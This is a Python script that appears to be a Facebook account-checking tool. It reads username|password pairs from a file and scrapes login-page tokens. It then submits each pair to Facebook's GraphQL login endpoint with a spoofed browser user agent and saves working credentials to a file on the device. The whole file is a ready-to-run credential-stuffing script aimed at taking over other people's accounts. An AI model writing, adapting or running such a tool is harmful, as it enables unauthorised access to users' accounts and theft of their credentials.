import os, time, random, re, sys, requests, json, uuid, base64

oks, cps, bkas = [], [], []
loop = 0

try:
    xvx = open('/sdcard/proxy.txt', 'r').read().splitlines()
except:
    xvx = ["http://127.0.0.1:8080"]

logo_text = "🔐 Facebook Login Tool (One ID at a time) 🔐"
linex = lambda: print('-' * 50)

os.system('clear')
print(logo_text)

dfile = input('\n📄 ENTER FILE PATH (e.g., sdcard/mahadi.txt): ')
try:
    dx = open(dfile, 'r').read().splitlines()
except FileNotFoundError:
    print('❌ FILE NOT FOUND...')
    time.sleep(1)
    sys.exit()

if not dx:
    print('❌ FILE IS EMPTY...')
    time.sleep(1)
    sys.exit()

for user in dx:
    os.system('clear')
    print(logo_text)
    print("📲 TOTAL ID : 1")
    print("🔄 PROCESSING ONE ID...")
    linex()

    try:
        ids, pw = user.split('|')
        ids, pw = ids.strip(), pw.strip()
    except:
        continue

    sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
    sys.stdout.flush()

    try:
        session = requests.Session()
        r = session.get("https://www.facebook.com/login.php")
        html = r.text

        # Extract tokens
        def rex(pat):
            m = re.search(pat, html)
            return m.group(1) if m else ""

        lsd = rex(r'name="lsd" value="(.*?)"')
        jazoest = rex(r'name="jazoest" value="(.*?)"')
        __spin_r = rex(r'"__spin_r":(\d+)') or "0"
        __spin_t = rex(r'"__spin_t":(\d+)') or str(int(time.time()))
        __spin_b = rex(r'"__spin_b":"(.*?)"') or "trunk"
        __rev = rex(r'"client_revision":(\d+)') or "0"
        __hsi = rex(r'"hsi":"(.*?)"') or str(int(time.time()))

        # Generate IDs
        guid = str(uuid.uuid4()).replace("-", "")[:16]
        waterfall_id = str(uuid.uuid4())
        lgnrnd = base64.b64encode(os.urandom(6)).decode()[:12]

        # Encoded password
        timestamp = str(int(time.time()))
        enc_pwd = f"#PWD_BROWSER:0:{timestamp}:{pw}"

        # doc_id for mutation — must be updated from live page JS
        doc_id = rex(r'"LoginMutation"\],\["(.*?)"') or "CURRENT_DOC_ID"

        # Build variables
        variables = {
            "input": {
                "client_mutation_id": "1",
                "actor_id": "0",
                "app": "facebook",
                "caa_login_request_extra_info": {
                    "guid": guid,
                    "jazoest": jazoest,
                    "lsd": lsd,
                    "lgnrnd": lgnrnd,
                    "login_source": "comet_headerless_login",
                    "locale": "en_GB",
                    "timezone": "0"
                },
                "credential_type": "password",
                "enc_password": {"sensitive_string_value": enc_pwd},
                "identifier": ids,
                "password": {"sensitive_string_value": enc_pwd},
                "persistent": True,
                "trusted_device_records": "{}",
                "waterfall_id": waterfall_id
            },
            "scale": 1
        }

        # Payload (variables + doc_id go here, NOT in cookies)
        payload = {
            "variables": json.dumps(variables),
            "doc_id": doc_id
        }

        headers = {
            'authority': 'www.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/login.php',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        }

        url = 'https://www.facebook.com/api/graphql/'
        result = session.post(url, data=payload, headers=headers).text
        print(result)

        if "session_key" in result:
            print(f"\n✅ OK: {ids}|{pw}")
            oks.append(ids)
            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{ids}|{pw}\n")
        else:
            print("\n❌ FAIL: Login not successful.")

    except Exception as e:
        print(f"\n⚠️ ERROR: {e}")
        time.sleep(2)

    loop += 1
    linex()
    print("🔚 PROCESS COMPLETE.")
    linex()
    input("➡️ PRESS ENTER TO LOGIN NEXT ID...")
